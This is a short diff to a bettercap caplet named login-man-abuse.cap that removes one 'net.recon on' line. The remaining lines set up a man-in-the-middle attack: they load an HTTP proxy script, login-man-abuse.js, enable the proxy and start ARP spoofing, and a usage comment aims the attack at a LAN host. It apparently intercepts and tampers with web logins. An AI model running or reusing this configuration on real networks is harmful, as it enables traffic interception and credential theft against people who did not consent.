@@ -3,7 +3,6 @@
 # sudo ./bettercap-ng -caplet caplets/login-man-abuse.cap -eval "set arp.spoof.targets 192.168.1.53"
 
 set http.proxy.script caplets/login-man-abuse.js
-net.recon on
 http.proxy on
 sleep 1
 arp.spoof on
